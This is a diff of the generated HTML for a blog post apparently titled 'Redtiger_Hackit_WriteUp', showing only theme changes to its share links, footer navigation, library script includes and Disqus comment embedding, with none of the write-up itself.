+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hdfzzf.github.io/2022/03/18/Redtiger&#39;s_Hackit_WriteUp/&title=Redtiger_Hackit_WriteUp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/03/18/Redtiger&#39;s_Hackit_WriteUp/&title=Redtiger_Hackit_WriteUp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/03/18/Redtiger&#39;s_Hackit_WriteUp/&title=Redtiger_Hackit_WriteUp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/03/18/Redtiger&#39;s_Hackit_WriteUp/&title=Redtiger_Hackit_WriteUp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/03/18/Redtiger&#39;s_Hackit_WriteUp/&name=Redtiger_Hackit_WriteUp&description=&lt;p&gt;网站：https://redtiger.labs.overthewire.org/&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318161838.png&#34; /&gt;&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/03/18/Redtiger&#39;s_Hackit_WriteUp/&t=Redtiger_Hackit_WriteUp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
 
     </div>
-  </footer>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    hdfzzf
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
 
   
-  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
-<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
-
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
   
-<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
-<script src="/js/third-party/search/local-search.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
 
 
+<script src="/js/main.js"></script>
 
+<!-- search -->
 
+<!-- Google Analytics -->
 
-  
-  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<!-- Baidu Analytics -->
 
+<!-- Cloudflare Analytics -->
 
+<!-- Umami Analytics -->
 
+<!-- Disqus Comments -->
 
-  
+    <script type="text/javascript">
+        var disqus_shortname = 'cactus-1';
 
-  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js","integrity":"sha256-r+3itOMtGGjap0x+10hu6jW/gZCzxHsoKrOd7gyRSGY="}}</script>
-<script src="/js/third-party/math/mathjax.js"></script>
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
 
-
-<script class="next-config" data-name="disqus" type="application/json">{"enable":true,"shortname":"hdfzzf","count":true,"i18n":{"disqus":"disqus"}}</script>
-<script src="/js/third-party/comments/disqus.js"></script>
+<!-- utterances Comments -->
 
 </body>
 </html>
